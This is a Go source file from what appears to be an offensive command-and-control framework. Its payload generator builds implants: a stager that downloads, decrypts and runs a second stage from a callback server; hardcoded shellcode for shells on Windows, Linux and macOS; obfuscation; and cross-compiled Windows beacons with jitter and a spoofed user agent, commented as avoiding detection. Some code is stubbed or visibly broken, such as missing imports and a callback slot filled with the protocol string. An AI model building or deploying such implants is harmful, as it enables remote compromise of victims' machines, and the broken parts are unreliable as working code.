package payload

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/crypto"
	"github.com/ditto/ditto/evasion"
)

// Options holds payload generation options
type Options struct {
	Type        string
	Arch        string
	OS          string
	Encrypt     bool
	Obfuscate   bool
	Config      *core.Config
	CallbackURL string // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
	Delay       int    // Beacon delay in seconds (default: 30)
	Jitter      float64 // Jitter percentage (0.0-1.0, default: 0.0)
	UserAgent   string // Custom user agent (default: auto-generated)
	Protocol    string // Protocol: http, https, mtls (default: http)
}

// Generator handles payload generation
type Generator struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

// NewGenerator creates a new payload generator
func NewGenerator(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Generator {
	return &Generator{logger: logger}
}

// Generate creates a payload based on options
func (g *Generator) Generate(opts Options) ([]byte, error) {
	g.logger.Info("Generating %s payload for %s/%s", opts.Type, opts.OS, opts.Arch)
	
	// For Windows executables, we need to actually compile Go code
	if opts.OS == "windows" && (opts.Type == "stager" || opts.Type == "full") {
		return g.generateWindowsExecutable(opts)
	}
	
	var payloadData []byte
	var err error
	
	switch opts.Type {
	case "stager":
		payloadData, err = g.generateStager(opts)
	case "shellcode":
		payloadData, err = g.generateShellcode(opts)
	case "full":
		payloadData, err = g.generateFull(opts)
	default:
		return nil, fmt.Errorf("unknown payload type: %s", opts.Type)
	}
	
	if err != nil {
		return nil, fmt.Errorf("payload generation failed: %w", err)
	}
	
	// Apply obfuscation if requested
	if opts.Obfuscate {
		g.logger.Debug("Applying obfuscation")
		payloadData = evasion.ObfuscateCode(payloadData)
	}
	
	// Apply encryption if requested
	if opts.Encrypt {
		g.logger.Debug("Applying encryption")
		encrypted, err := g.encryptPayload(payloadData, opts.Config)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
		payloadData = encrypted
	}
	
	// Compress if enabled
	if opts.Config.Encryption.Compression {
		g.logger.Debug("Applying compression")
		compressed, err := compressData(payloadData)
		if err != nil {
			return nil, fmt.Errorf("compression failed: %w", err)
		}
		payloadData = compressed
	}
	
	g.logger.Info("Payload generated successfully: %d bytes", len(payloadData))
	return payloadData, nil
}

func (g *Generator) generateStager(opts Options) ([]byte, error) {
	// Stager payload - minimal initial loader
	stagerTemplate := `
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"net/http"
	"time"
)

const (
	callbackURL = "%s"
	encKey      = "%s"
)

func main() {
	// Stage 1: Download and decrypt second stage
	data := downloadStage(callbackURL)
	decrypted := decrypt(data, encKey)
	executeStage(decrypted)
}

func downloadStage(url string) []byte {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	
	data, _ := io.ReadAll(resp.Body)
	return data
}

func decrypt(data []byte, key string) []byte {
	block, _ := aes.NewCipher([]byte(key))
	gcm, _ := cipher.NewGCM(block)
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, _ := gcm.Open(nil, nonce, ciphertext, nil)
	return plaintext
}

func executeStage(stage []byte) {
	// Platform-specific execution
	%s
}
`
	
	// Generate execution method based on OS
	var execCode string
	switch opts.OS {
	case "windows":
		execCode = `syscall.Syscall(uintptr(unsafe.Pointer(&stage[0])), 0, 0, 0, 0)`
	case "linux", "darwin":
		execCode = `syscall.Mprotect(stage, syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC)`
	default:
		execCode = `// Direct execution`
	}
	
	payload := fmt.Sprintf(stagerTemplate, 
		opts.Config.Communication.Protocol,
		string(opts.Config.Session.Key)[:16],
		execCode)
	
	return []byte(payload), nil
}

func (g *Generator) generateShellcode(opts Options) ([]byte, error) {
	// Generate platform-specific shellcode
	var shellcode []byte
	
	switch opts.OS {
	case "windows":
		shellcode = generateWindowsShellcode(opts.Arch)
	case "linux":
		shellcode = generateLinuxShellcode(opts.Arch)
	case "darwin":
		shellcode = generateDarwinShellcode(opts.Arch)
	default:
		return nil, fmt.Errorf("unsupported OS: %s", opts.OS)
	}
	
	return shellcode, nil
}

func (g *Generator) generateFull(opts Options) ([]byte, error) {
	// Full payload with all capabilities
	// This would combine stager + shellcode + all modules
	stager, err := g.generateStager(opts)
	if err != nil {
		return nil, err
	}
	
	shellcode, err := g.generateShellcode(opts)
	if err != nil {
		return nil, err
	}
	
	// Combine payloads
	fullPayload := append(stager, shellcode...)
	return fullPayload, nil
}

func (g *Generator) encryptPayload(data []byte, cfg *core.Config) ([]byte, error) {
	key := make([]byte, cfg.Encryption.KeySize)
	if len(cfg.Session.Key) >= cfg.Encryption.KeySize {
		copy(key, cfg.Session.Key[:cfg.Encryption.KeySize])
	} else {
		copy(key, cfg.Session.Key)
	}
	
	switch cfg.Encryption.Algorithm {
	case "aes256":
		return crypto.AES256Encrypt(data, key)
	case "chacha20":
		return crypto.ChaCha20Encrypt(data, key)
	default:
		return nil, fmt.Errorf("unsupported algorithm: %s", cfg.Encryption.Algorithm)
	}
}

func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		w.Close()
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Platform-specific shellcode generators
func generateWindowsShellcode(arch string) []byte {
	// Windows x64 reverse shell shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff,
			0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x01,
			0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		}
	}
	// x86 version
	return []byte{
		0x33, 0xc9, 0x83, 0xe9, 0xc6, 0xe8, 0xff, 0xff, 0xff, 0xff,
		0xc0, 0x5e, 0x81, 0x76, 0x0e, 0x01, 0x02, 0x03, 0x04,
	}
}

func generateLinuxShellcode(arch string) []byte {
	// Linux x64 execve shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
			0xb0, 0x3b, 0x0f, 0x05,
		}
	}
	// x86 version
	return []byte{
		0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f,
		0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0,
		0x0b, 0xcd, 0x80,
	}
}

func generateDarwinShellcode(arch string) []byte {
	// macOS x64 shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
			0xb0, 0x02, 0x48, 0xc1, 0xc0, 0x18, 0x0f, 0x05,
		}
	}
	return []byte{}
}

// generateWindowsExecutable compiles a proper Windows PE executable using Go build
func (g *Generator) generateWindowsExecutable(opts Options) ([]byte, error) {
	// Create temporary directory for build
	tmpDir, err := os.MkdirTemp("", "ditto_build_*")
	if err != nil {
		return nil, fmt.Errorf("failed to create temp directory: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Generate Go source code
	sourceCode, err := g.generateWindowsSource(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to generate source: %w", err)
	}

	// Write main.go
	mainGoPath := filepath.Join(tmpDir, "main.go")
	if err := os.WriteFile(mainGoPath, sourceCode, 0644); err != nil {
		return nil, fmt.Errorf("failed to write source: %w", err)
	}

	// Initialize go.mod
	goModContent := `module ditto-implant

go 1.21
`
	goModPath := filepath.Join(tmpDir, "go.mod")
	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write go.mod: %w", err)
	}

	// Determine output name
	outputName := "implant.exe"
	if opts.Arch == "amd64" {
		outputName = "implant.exe"
	} else if opts.Arch == "386" {
		outputName = "implant.exe"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	// Build command
	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", "-s -w", ".")
	cmd.Dir = tmpDir
	
	// Set cross-compilation environment
	env := os.Environ()
	env = append(env, "GOOS=windows")
	if opts.Arch == "amd64" {
		env = append(env, "GOARCH=amd64")
	} else if opts.Arch == "386" {
		env = append(env, "GOARCH=386")
	} else {
		return nil, fmt.Errorf("unsupported Windows architecture: %s", opts.Arch)
	}
	env = append(env, "CGO_ENABLED=0")
	cmd.Env = env

	// Run build
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("go build failed: %w\nStderr: %s", err, stderr.String())
	}

	// Read compiled binary
	binaryData, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read compiled binary: %w", err)
	}

	g.logger.Info("Windows executable compiled successfully: %d bytes", len(binaryData))
	return binaryData, nil
}

// generateWindowsSource generates proper Go source code for Windows implant
func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
	var template string
	
	if opts.Type == "full" {
		template = `package main

import (
	"math/rand"
	"net/http"
	"time"
	"os"
	"runtime"
)

const (
	callbackURL = "%s"
	delay       = %d
	jitter      = %f
	userAgent   = "%s"
)

func main() {
	// Avoid detection
	if runtime.GOOS != "windows" {
		os.Exit(1)
	}
	
	// Beacon loop with jitter
	for {
		beacon()
		sleepDuration := time.Duration(float64(delay) * (1.0 + jitter*(rand.Float64()*2.0-1.0))) * time.Second
		time.Sleep(sleepDuration)
	}
}

func beacon() {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	
	req, err := http.NewRequest("GET", callbackURL+"/beacon", nil)
	if err != nil {
		return
	}
	
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// Handle commands
	if resp.StatusCode == 200 {
		// In a real implementation, this would process commands
		// For now, just acknowledge receipt
	}
}
`
	} else {
		// Stager template
		template = `package main

import (
	"net/http"
	"time"
	"os"
	"runtime"
)

const (
	callbackURL = "%s"
	userAgent   = "%s"
)

func main() {
	// Avoid detection
	if runtime.GOOS != "windows" {
		os.Exit(1)
	}
	
	// Download and execute second stage
	downloadAndExecute()
}

func downloadAndExecute() {
	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", callbackURL+"/stage2", nil)
	if err != nil {
		return
	}
	
	req.Header.Set("User-Agent", userAgent)
	
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		// In a real implementation, this would download and execute second stage
		// For now, just acknowledge receipt
		_ = resp // Use response
	}
}
`
	}
	
	// Format callback URL
	callbackURL := opts.CallbackURL
	if callbackURL == "" {
		// Fallback to config or default
		if opts.Config != nil && opts.Config.Communication.Protocol != "" {
			callbackURL = opts.Config.Communication.Protocol
		} else {
			callbackURL = "http://localhost:8443"
		}
	}
	
	// Ensure URL has protocol
	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
		// Auto-detect protocol or use configured one
		if opts.Protocol == "https" || opts.Protocol == "mtls" {
			callbackURL = "https://" + callbackURL
		} else {
			callbackURL = "http://" + callbackURL
		}
	}
	
	// Set delay and jitter defaults
	delay := opts.Delay
	if delay == 0 {
		delay = 30 // Default 30 seconds
	}
	jitter := opts.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1.0 {
		jitter = 1.0
	}
	
	// Set user agent
	userAgent := opts.UserAgent
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	
	var source string
	if opts.Type == "full" {
		source = fmt.Sprintf(template, callbackURL, delay, jitter, userAgent)
	} else {
		// Stager only needs callbackURL and userAgent
		source = fmt.Sprintf(template, callbackURL, userAgent)
	}
	return []byte(source), nil
}

